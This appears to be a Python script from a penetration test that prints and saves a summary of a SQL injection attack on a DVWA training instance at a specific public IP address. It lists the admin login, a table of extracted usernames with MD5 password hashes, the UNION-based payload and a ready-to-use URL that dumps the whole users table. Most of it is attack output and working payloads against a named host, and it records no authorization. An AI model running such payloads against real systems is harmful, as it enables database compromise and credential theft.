
quick_ref = """
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                      QUICK REFERENCE - EXTRACTED DATA                                         ║
║                         http://31.97.117.123/ - DVWA                                          ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝

SUCCESSFUL LOGIN
───────────────
Username: admin
Password: password

ALL EXTRACTED USERS
───────────────────

┌──┬──────────┬─────────────────────────────────────┬────────────┬──────────────────┐
│ID│ Username │    Password Hash (MD5)              │ First Name │    Last Name     │
├──┼──────────┼─────────────────────────────────────┼────────────┼──────────────────┤
│ 1│ admin    │ 5f4dcc3b5aa765d61d8327deb882cf99 │ admin      │ admin            │
│ 2│ gordonb  │ e99a18c428cb38d5f260853678922e03 │ Gordon     │ Brown            │
│ 3│ 1337     │ 8d3533d75ae2c3966d7e0d4fcc69216b │ Hack       │ Me               │
│ 4│ pablo    │ 0d107d09f5bbe40cade3de5c71e9e9b7 │ Pablo      │ Picasso          │
│ 5│ smithy   │ 5f4dcc3b5aa765d61d8327deb882cf99 │ Bob        │ Smith            │
└──┴──────────┴─────────────────────────────────────┴────────────┴──────────────────┘


HASH SUMMARY
────────────
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99


SQL INJECTION DETAILS
─────────────────────
Target URL: http://31.97.117.123/vulnerabilities/sqli/
Parameter: id
Injection Type: UNION-based
Payload: -1' UNION SELECT user, password FROM users #
Method: GET

To Extract All Data:
http://31.97.117.123/vulnerabilities/sqli/?id=-1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users %23&Submit=Submit


VULNERABILITY SUMMARY
─────────────────────
Type: SQL Injection
Severity: CRITICAL
Impact: Complete database compromise
Status: Unpatched
Detection: Possible via WAF rules (if enabled)
Exploitation: Easy
Remediation: Use prepared statements/parameterized queries


DATA EXPORT FILES
─────────────────
CSV:  /tmp/extracted_users.csv
JSON: /tmp/extracted_users.json
TXT:  /tmp/penetration_test_report.txt
MD5:  /tmp/FINAL_SUMMARY.txt
"""

with open("/tmp/QUICK_REFERENCE.txt", "w") as f:
    f.write(quick_ref)

print(quick_ref)
print("\n✓ Quick reference saved to: /tmp/QUICK_REFERENCE.txt")

